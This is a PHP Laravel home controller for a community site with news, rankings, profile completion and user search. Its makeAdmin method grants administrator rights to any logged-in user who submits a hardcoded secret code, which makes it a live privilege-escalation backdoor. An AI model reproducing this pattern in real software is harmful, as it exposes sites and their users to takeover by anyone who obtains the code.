<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use App\Http\Requests;
use App\Models\User;
use App\Models\Category;
use App\Models\News;
use App\Models\Post;
use App\Models\GenericModel;
use Auth;
use Cache;


class HomeController extends Controller
{

    function __construct()
    {
        $this->Generic_model = new GenericModel;
    }
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    // public function __construct()
    // {
    //     $this->middleware('auth');
    // }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {

        return redirect('/');
    }

    public function welcome()
    {
        $news = News::orderBy('created_at', 'desc')->get()->take(3);
        $popular = Category::where('popular', 1)->where('image_1', '!=', null)->get();
        return view('welcome', compact('news', 'popular'));
    }

    public function completeProfile(Request $request)
    {
        $response = array();
         $rules = array(
                'name' => ['required', 'string', 'max:25'],
                'gender' => ['required'],
                'month' => ['required'],
                'day' => ['required'],
                'year' => ['required'],
                //'referal_code' => ['required'],
            );
        $validator = Validator::make($request->all(), $rules);
        if($validator->fails())
        {
            array_push($response, array("result"=>'0' , "message" =>'Please enter required fields.'));
            echo json_encode($response) ;
        }
        else
        {

            $data['name'] = $request->input('name');
            $data['gender'] = $request->input('gender');
            $month = $request->input('month');
            $day = $request->input('day');
            $year = $request->input('year');
            $date = $month.' '.$day.' '.$year;

            $data['birth_date'] = date('Y-m-d', strtotime($date));
           
            $id= Auth::id();


            $getCountry = getUsercountry();
            if(!empty($getCountry['country'])){
             $data['country'] = $getCountry['country'];
            }
            //$data['referal_code'] = $request->input('referal_code');
            $update = $this->Generic_model->updateRecord('users',$data,array('id'=>$id));
            if (!empty($update))
            {
                Auth::user()->setProfileCompleteAttribute(1);
                array_push($response, array("result"=>'1' , "message" =>'Data Update SuccessFully.'));
                echo json_encode($response);
            }
            else
            {
                array_push($response, array("result"=>'0' , "message" =>'Soemthing went wrong.'));
                echo json_encode($response) ;
            }
        }
    }

    // Filtering function
    /*
    1. Filter by games, country, gender, status, price
    
    */
    public function users(Request $request)
    {
        return response()->json();
    }

    public function news()
    {
        $posts = News::with('postAuthor')->orderBy('created_at', 'desc')->paginate(10);
        return view('news', compact('posts'));
    }

    public function post(News $post)
    {
        return view('post', ['post' => $post]);
    }

    public function faq()
    {
        return view('faq');
    }

    public function rankings()
    {
        $users = User::where('seller_rank', 0)->orderBy('points', 'desc')->get()->take(50);
        $sellers = User::where('seller_rank', '>=', 1)->orderBy('points', 'desc')->get()->take(50);
        return view('rankings', compact('users', 'sellers'));
    }

    public function chat()
    {
        return view('chat.chat');
    }

    public function makeAdmin(Request $request)
    {
        if (isset($request->code) && $request->code == '7657657580e71965VrehhgFVxaad4512bd99e8767765e25') {
            $user = User::whereId(Auth::id())->first();
            $user->user_group = 3;
            $user->save();
            return redirect('/admin');
        } else return redirect('/');
    }

    public function search(Request $request)
    {
        if ($request->ajax() == false) {
            return redirect('/');
        }
        $usersJSON = array();
        $users = User::where('name', 'LIKE', "%" . $request->q . "%")->get()->take(10);
        foreach ($users as $user) {
            if (Cache::has('user-is-online-' . $user->id)) {
                // continue
                $status = 'Online';
            } else {
                $status = 'Offline';
            }
            array_push($usersJSON, ['id' => $user->id, 'name' => $user->name, 'profile_picture' => $user->profile_picture, 'status' => $status]);
        }
        return json_encode($usersJSON, JSON_HEX_QUOT);
    }

    public function tos()
    {
        return view('legal.tos');
    }
    public function privacy_policy()
    {
        return view('legal.privacy');
    }
    public function community_guidelines()
    {
        return view('legal.community');
    }
}
